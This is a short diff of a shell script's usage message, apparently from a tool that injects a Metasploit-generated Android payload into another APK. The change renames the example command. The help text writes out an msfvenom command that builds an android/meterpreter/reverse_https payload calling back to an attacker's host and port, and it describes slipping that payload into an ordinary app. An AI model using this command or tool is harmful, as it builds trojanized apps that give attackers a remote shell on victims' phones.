@@ -9,7 +9,7 @@ if [ $# -lt 2 ] || [ ${1: -4} != ".apk" ] || [ ${2: -4} != ".apk" ]; then
     echo "-------------INVALID ARGUMENT------------"
     echo "Please pass in a msfvenom generated .apk file followed by the .apk you want to inject it into"
     echo "msfvenom -p android/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -o payload.apk"
-    echo "Ex: apkwash payload.apk com.myapp.byme.apk"
+    echo "Ex: apkinjector payload.apk com.myapp.byme.apk"
     echo "-----------------------------------------"
     exit 1
 fi
